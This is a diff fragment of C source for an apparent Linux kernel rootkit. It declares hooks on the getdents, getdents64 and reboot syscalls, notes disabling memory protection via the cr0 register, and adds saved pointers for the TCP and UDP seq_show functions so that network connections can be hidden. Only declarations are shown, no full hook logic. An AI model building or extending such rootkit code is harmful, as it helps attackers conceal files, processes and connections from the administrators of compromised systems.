@@ -17,7 +17,7 @@ So, even if it's not possible to optimize this particular probepoint, there'll b
 Hooking is also achievable with changing the cr0 register to disable memory protection make the memory writable
 */
 
-const int ACTIVE_HOOKS_SIZE = 4; /*Available number of hooks to store*/
+const int ACTIVE_HOOKS_SIZE = 8; /*Available number of hooks to store*/
 
 #ifdef PTREGS_SYSCALL_STUB
 typedef asmlinkage long (*ptregs_t)(const struct pt_regs *regs); /*define type for syscalls functions*/
@@ -31,6 +31,11 @@ static asmlinkage long (*orig_getdents64)(unsigned int fd, struct linux_dirent64
 static asmlinkage long (*orig_getdents)(unsigned int fd, struct linux_dirent *dirent, unsigned int count);
 static asmlinkage int (*orig_reboot)(int magic, int magic2, int cmd, void *arg);
 #endif
+static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
+static asmlinkage long (*orig_tcp6_seq_show)(struct seq_file *seq, void *v);
+static asmlinkage long (*orig_udp4_seq_show)(struct seq_file *seq, void *v);
+static asmlinkage long (*orig_udp6_seq_show)(struct seq_file *seq, void *v);
+
 
 #define HOOK(_name, _hook, _orig)\
 {					             \
